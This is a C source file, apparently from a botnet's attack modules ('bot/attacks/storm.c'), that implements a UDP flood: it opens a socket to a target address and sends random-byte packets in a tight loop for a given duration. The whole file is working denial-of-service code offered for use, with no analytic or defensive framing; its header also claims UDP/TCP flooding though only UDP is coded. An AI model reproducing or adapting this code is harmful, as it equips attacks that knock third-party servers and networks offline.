// language: c
// file: bot/attacks/storm.c
// runtime: gcc / cross-compiled via make scripts
// target: Linux high-volume UDP/TCP storm flood implementation

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <time.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include "storm.h"

void attack_storm(uint32_t target_ip, uint16_t port, uint8_t duration, uint16_t len) {
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) return;

    struct sockaddr_in sin;
    sin.sin_family = AF_INET;
    sin.sin_port = htons(port ? port : (uint16_t)(rand() % 65535 + 1));
    sin.sin_addr.s_addr = target_ip;

    char *buf = malloc(len);
    if (!buf) {
        close(sock);
        return;
    }

    for (int i = 0; i < len; i++) {
        buf[i] = (char)(rand() % 256);
    }

    time_t start = time(NULL);
    while (time(NULL) - start < duration) {
        sendto(sock, buf, len, 0, (struct sockaddr *)&sin, sizeof(sin));
    }

    free(buf);
    close(sock);
}